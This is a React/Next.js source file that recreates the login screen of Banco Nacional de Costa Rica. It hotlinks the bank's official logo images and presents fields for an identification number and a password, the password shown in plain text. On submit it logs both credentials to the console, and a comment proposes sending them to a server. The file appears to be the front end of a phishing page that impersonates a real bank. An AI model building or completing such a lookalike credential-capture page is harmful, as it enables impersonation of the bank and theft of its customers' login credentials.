'use client'
import React from 'react'

function Home() {
    const [identification, setIdentification] = React.useState('');
    const [password, setPassword] = React.useState('');
    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        // Aquí puedes manejar el envío del formulario, por ejemplo, enviar los datos a un servidor
        console.log('Identificación:', identification);
        console.log('Contraseña:', password);
    }
    return (
        <>
            <div className='bg-[#2d549f]' >
                <div className='mx-auto w-[80%] py-4'>

                    <img width="100" src="https://auth.bncr.fi.cr/adfs/portal/images/bncr/logo.png" alt="Banco Nacional de Costa Rica" />
                </div>
            </div>
            <div className='' >
                <img width="150" src="https://auth.bncr.fi.cr/adfs/portal/images/bncr/logo.png" alt="Banco Nacional de Costa Rica" />
            </div>
            <div className='MainContent'>
                <div className='container mx-auto w-[80%] grid grid-cols-3 grid-rows-3 gap-4 min-h-[500px]'>
                    {/* Primera fila */}
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 1, Columna 1 vacía */}
                    </div>
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 1, Columna 2 vacía */}
                    </div>
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 1, Columna 3 vacía */}
                    </div>

                    {/* Segunda fila */}
                    <div className='col-span-1 row-span-1'>
                        <div className='flex flex-col gap-3 items-center justify-center h-full w-[290px]'>
                            <img width="30" src="https://auth.bncr.fi.cr/adfs/portal/images/bncr/firma.png" alt="Banco Nacional de Costa Rica" />
                            <input value={identification} onChange={(e) => setIdentification(e.target.value)} placeholder='Identificación' type="text" className='usrInput rounded placeholder-[#666666]' />
                            <input value={password} onChange={(e) => setPassword(e.target.value)} placeholder='Contraseña' type="text" className='usrInput rounded placeholder-[#666666]' />
                            <button onClick={handleSubmit} className='submitButton'>Iniciar Sesión</button>
                            <div>
                                <div className='dot'></div>
                                <a className='text-[#2d549f] font-bold' href="#">¿Olvidaste tu contraseña?</a>
                            </div>
                        </div>
                    </div>
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 2, Columna 2 vacía */}
                    </div>
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 2, Columna 3 vacía */}
                    </div>

                    {/* Tercera fila */}
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 3, Columna 1 vacía */}
                    </div>
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 3, Columna 2 vacía */}
                    </div>
                    <div className='col-span-1 row-span-1'>
                        {/* Fila 3, Columna 3 vacía */}
                    </div>
                </div>
            </div>
        </>

    )
}

export default Home